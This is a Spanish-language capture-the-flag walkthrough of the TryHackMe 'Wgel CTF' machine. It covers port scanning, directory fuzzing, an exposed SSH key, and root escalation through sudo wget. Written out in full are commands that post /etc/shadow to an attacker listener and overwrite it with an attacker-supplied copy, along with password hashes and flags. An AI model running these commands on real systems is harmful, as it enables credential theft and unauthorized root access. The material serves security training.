---
layout: single
title: Wgel CTF - Tryhackme
excerpt: "El punto de entrada es el servicio web, mirando el código fuente obtenemos el nombre de un  usuario y fuzzeando encontramos un directorio en el cual hay una id_rsa que utilizamos para acceder a la máquina vícitma"
date: 2023-01-12
classes: wide
header:
  teaser: /assets/images/tryhackme-writeup-wgel CTF/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png
  teaser_home_page: true
  icon: /assets/images/tryhackme_logo.svg
categories:
  - tryhackme
tags:
  - linux
  - fácil
  - wget
---

<p align="center">
  <img width="460" height="300" src="/assets/images/tryhackme-writeup-wgel CTF/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png">
</p>

El punto de entrada es el servicio web, mirando el código fuente obtenemos el nombre de un  usuario y fuzzeando encontramos un directorio en el cual hay una id_rsa que utilizamos para acceder a la máquina vícitma

## Resumen

- Mediante el código fuente obtenemos un usuario y conseguimos una id_rsa en un directorio que encontramos fuzzeando, lo cual nos permite ganar acceso mediante ssh

## Escaneo de puertos

```
# sudo nmap --min-rate 5000 -p- --open -sS -Pn -n -v 10.10.102.184 -oG openPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 18:32 CET
Initiating SYN Stealth Scan at 18:32
Scanning 10.10.102.184 [65535 ports]
Discovered open port 22/tcp on 10.10.102.184
Discovered open port 80/tcp on 10.10.102.184
Completed SYN Stealth Scan at 18:33, 13.62s elapsed (65535 total ports)
Nmap scan report for 10.10.102.184
Host is up (0.062s latency).
Not shown: 64994 closed tcp ports (reset), 539 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# nmap -sC -sV -p22,80 10.10.102.184 -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 18:36 CET
Nmap scan report for 10.10.102.184
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración web

Al acceder al servicio web nos encontramos la página por defecto de apache

![](/assets/images/tryhackme-writeup-wgel CTF/Pasted image 20230112184651.png)

En el código fuente nos encontramos el nombre de un usuario

![](/assets/images/tryhackme-writeup-wgel CTF/Pasted image 20230112191126.png)

Fuzzeamos en busca de nuevos directorios y encontramos un llamado /sitemap

```
# wfuzz -c -t200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.102.184/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.102.184/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        378 L    977 W      11374 Ch    "# directory-list-2.3-medium.txt"                                                                                      
000000003:   200        378 L    977 W      11374 Ch    "# Copyright 2007 James Fisher"                                                                                        
000000010:   200        378 L    977 W      11374 Ch    "#"                                                                                                                    
000000006:   200        378 L    977 W      11374 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000002:   200        378 L    977 W      11374 Ch    "#"                                                                                                                    
000000005:   200        378 L    977 W      11374 Ch    "# This work is licensed under the Creative Commons"                                                                   
000000004:   200        378 L    977 W      11374 Ch    "#"                                                                                                                    
000000008:   200        378 L    977 W      11374 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000009:   200        378 L    977 W      11374 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000011:   200        378 L    977 W      11374 Ch    "# Priority ordered case sensative list, where entries were found"                                                     
000000012:   200        378 L    977 W      11374 Ch    "# on atleast 2 different hosts"                                                                                       
000000013:   200        378 L    977 W      11374 Ch    "#"                                                                                                                    
000000014:   200        378 L    977 W      11374 Ch    "http://10.10.102.184/"                                                                                                
000000043:   301        9 L      28 W       316 Ch      "sitemap"                 
```

Al acceder al sitio web observamos el siguiente contenido
![](/assets/images/tryhackme-writeup-wgel CTF/Pasted image 20230112185045.png)

Fuzzeamos en busca de nuevos directorios

```
# wfuzz -c -t200 --hc=404 -w /usr/share/dirb/wordlists/common.txt http://10.10.102.184/sitemap/FUZZ                            
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.102.184/sitemap/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        516 L    1786 W     21080 Ch    "http://10.10.102.184/sitemap/"                                                                                        
000000011:   403        9 L      28 W       278 Ch      ".hta"                                                                                                                 
000000012:   403        9 L      28 W       278 Ch      ".htaccess"                                                                                                            
000000013:   403        9 L      28 W       278 Ch      ".htpasswd"                                                                                                            
000000022:   301        9 L      28 W       321 Ch      ".ssh"                                                                                                                 
000001114:   301        9 L      28 W       320 Ch      "css"                                                                                                                  
000001648:   301        9 L      28 W       322 Ch      "fonts"                                                                                                                
000001991:   301        9 L      28 W       323 Ch      "images"                                                                                                               
000002020:   200        516 L    1786 W     21080 Ch    "index.html"                                                                                                           
000002179:   301        9 L      28 W       319 Ch      "js"                                                                                                                   
```

Econtramos un directorio /.ssh con una id_rsa

![](/assets/images/tryhackme-writeup-wgel CTF/Pasted image 20230112190717.png)

![](/assets/images/tryhackme-writeup-wgel CTF/Pasted image 20230112190813.png)

Nos conectamos a la máquina víctima mediante ssh como el usuario jessie

```
# ssh -i id_rsa jessie@10.10.102.184
The authenticity of host '10.10.102.184 (10.10.102.184)' can't be established.
ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.102.184' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```

El usuario jessie puede ejecutar como usario privilegiado el comando weget

```
jessie@CorpOne:/var/www/html/sitemap/.ssh$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Con wget vamos a sobrescribir el /etc/shadow, cambiando así la contraseña del usuario root. Lo primero que debemos hacer es capturar el /etc/shadow de la máquina víctima y almacenarlo en un fichero. Desde la máquina víctima ejecutamos siguiente comando

```
sudo /usr/bin/wget --post-file=/etc/shadow 10.18.103.166
```

En nuestra máquina nos ponemos en escucha

```
nc -nlvp 80
```

Con hash-identifier analizamos para ver que tipo de hash hay en el /etc/shadow

```
# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.                   

Possible Hashs:
[+] SHA-256
```

Creamos una password cifrada mediante sha-256 y la introducimos en el /etc/shadow

```
sudo mkpasswd --method=sha-256 --stdin
Contraseña: root
$5$xZPFpXu4cWJwsI4/$PmWxYqcVw18Z6Npn73Gnzk5N.XkyxNP2fSA9xcfiYC3
```

```
root:$5$xZPFpXu4cWJwsI4/$PmWxYqcVw18Z6Npn73Gnzk5N.XkyxNP2fSA9xcfiYC3:18195:
0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663
bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
sshd:*:18195:0:99999:7:::
```

Para sobrescribir el /etc/shadow de la máquina víctima nos ponemos en escucha desde nuestra máquina

```
python -m http.server 9999
```

Desde la máquina víctima ejecutamos el siguiente comando, que sobrescribirá el /etc/shadow asignandole como contraseña root al usuario root

```
sudo wget http://10.18.103.166:9999/shadow -O /etc/shadow
```

Nos convertimos en usuario root y capturamos las flags

```
jessie@CorpOne:~$ su root
Password: 
root@CorpOne:/home/jessie# whoami
root
root@CorpOne:/home/jessie# cat /home/jessie/Documents/user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
root@CorpOne:/home/jessie# cat /root/root_flag.txt 
b1b968b37519ad1daa6408188649263d
```
